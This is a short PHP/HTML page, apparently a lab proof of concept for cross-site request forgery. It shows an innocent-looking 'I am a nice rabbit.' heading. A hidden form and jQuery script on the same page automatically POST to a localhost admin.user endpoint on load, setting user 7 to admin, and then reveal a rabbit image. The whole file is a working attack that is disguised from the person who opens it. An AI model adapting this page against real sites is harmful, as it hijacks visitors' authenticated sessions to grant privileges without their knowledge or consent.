<?php
/**
 * Created by PhpStorm.
 * User: Julien
 * Date: 15/01/17
 * Time: 12:22
 */?>

<h1>I am a nice rabbit.</h1>
<img  src="https://danachildsintuitive.files.wordpress.com/2015/03/rabbit-in-hat-pic.jpg" style="display:none;">
<form id="csrfHack" action="http://localhost:8888/admin.user" method="post" style="visibility: hidden;">
    <input name="_method" type="hidden" value="admin" />
    <input name="_id" type="hidden" value="7" />
</form>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script>

    function SubForm (){
        $.ajax({
            url:'http://localhost:8888/admin.user',
            type:'post',
            data:$('#csrfHack').serialize(),
            success:function(){
                console.log('submitted');
                $( "img" ).fadeIn( 3000, function() {});
            }
        });
    }

    SubForm();
</script>
